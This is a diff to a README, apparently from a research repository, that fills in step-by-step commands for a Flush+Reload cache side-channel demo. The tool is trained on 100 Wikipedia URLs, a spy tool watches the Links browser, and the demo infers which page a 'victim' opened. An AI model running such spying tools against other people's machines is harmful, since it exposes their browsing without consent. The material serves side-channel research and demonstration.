@@ -207,13 +207,13 @@ spy on somebody. I'm assuming you've followed steps 1-4 above.
 Make a directory to hold the training data:
 
 ```
-mkdir ~/attack_training
+$ mkdir ~/attack_training
 ```
 
 Run the training tool on 100 Wikipedia URLs:
 
 ```
-ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackTrainer.rb \
+$ ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackTrainer.rb \
     --url-list ~/flush-reload-attacks/experiments/links/url_sets/wiki-top-100-of-2013.txt \
     --train-dir ~/attack_training/demo1 \
     --run-binary ~/flush-reload-attacks/experiments/links/binaries/links-demo \
@@ -224,13 +224,44 @@ ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackTrainer.rb \
 
 **5.2. Start the Spy Tool**
 
-TODO
+Make a directory to store the spying results:
+
+```
+$ mkdir ~/attack_spying
+```
+
+Start the spy tool:
+
+```
+$ ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackRecorder.rb \
+    --spy-binary ~/flush-reload-attacks/experiments/links/binaries/links-demo \
+    --probe-file ~/flush-reload-attacks/experiments/links/binaries/links-demo.probes \
+    --output-dir ~/attack_spying
+```
 
 **5.3. Pretend to be the Victim**
 
-TODO
+With the spy tool running, visit one of the 100 Wikipedia pages in Links:
+
+```
+$ ~/flush-reload-attacks/experiments/links/binaries/links-demo http://en.wikipedia.org/wiki/Breaking_Bad
+```
+
+The spy tool should detect that you ran Links and create a file with the probe
+sequence recording in `~/attack_spying`. The name of the file is the UNIX
+timestamp of when it was recorded. You can stop the spying tool now.
 
 **5.4. Figure Out Which Page the Victim Visited**
 
-TODO
+Inside `~/attack_spying` you should see a file with a numeric name. That's the
+recording of which probes were hit as you ran Links pretending to be the victim.
+To identify which Wikipedia page that corresponds to, run the input
+identification tool:
 
+```
+$ ruby ~/flush-reload-attacks/flush-reload/myversion/ruby/AttackRecovery.rb \
+    --recording-dir ~/attack_spying \
+    --train-dir ~/attack_training/demo1 \
+    --max-length 1000
+```
+Did it get guess right? It's not perfect, so it might not have. Try it again!
